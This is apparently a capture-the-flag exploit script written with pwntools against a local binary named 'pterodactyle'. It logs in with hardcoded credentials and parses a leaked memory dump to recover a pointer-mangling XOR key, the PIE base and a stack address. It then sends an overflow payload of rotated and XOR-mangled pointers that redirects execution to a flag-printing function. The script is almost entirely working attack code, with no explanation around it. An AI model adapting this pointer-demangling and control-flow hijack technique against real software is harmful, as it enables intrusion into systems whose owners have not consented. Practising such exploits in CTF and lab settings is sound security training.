from pwn import *
from time import *

elf = ELF('./pterodactyle')

p = process(elf.path)


def ror1(reg, count):
    src = bin(reg)[2:]
    src = "0" * (64 - len(src)) + src
    return int(src[-count:] + src[:64 - count],2)

def rol1(reg, count):
    src = bin(reg)[2:]
    src = "0" * (64 - len(src)) + src
    return int(src[count:] + src[:count],2)


p.recvuntil(b">> ")
p.sendline(b"1")


# USERNAME: admin
p.recvuntil(b">> ")
p.sendline(b"admin")

# PASSWORD: MySeCr3TP4$$W0rd
p.recvuntil(b">> ")
p.sendline(b"MySeCr3TP4$$W0rd")

#Get Leak
p.recvuntil(b">> ")
p.sendline(b"2")

p.recvuntil(b":-)")


leak = p.recvuntil(b"1: Log in", drop=True)



n=8
line = leak.strip()
leak = [line[i:i+n] for i in range(0, len(line), n)]


    

xor_key = ror1(u64(leak[7]),0x11) ^ int(u64(leak[2])+527)



print("[+]XOR KEY: %s" % hex(xor_key))

pie_addr = ror1(u64(leak[7]), 0x11) ^ xor_key
pie_addr -= 4895 

print("[+]PIE @%s" %hex(pie_addr))

libc_leak = ror1(u64(leak[1]), 0x11) ^ xor_key

print("[+]STACK LEAK @%s"  % hex(libc_leak))


p.sendline(b"3")
p.sendline(b"1")

get_flag = pie_addr + 5525

payload = b"\x00"*72
payload += p64(rol1(libc_leak-30 ^ xor_key, 0x11))
payload += p64(rol1(libc_leak ^ xor_key, 0x11))


payload += p64(rol1(get_flag ^ xor_key, 0x11))



payload = xor(payload, b"\x77")

sleep(1)
p.sendline(payload)
p.sendline(payload)

print("[+] GETTING FLAG")
p.interactive()
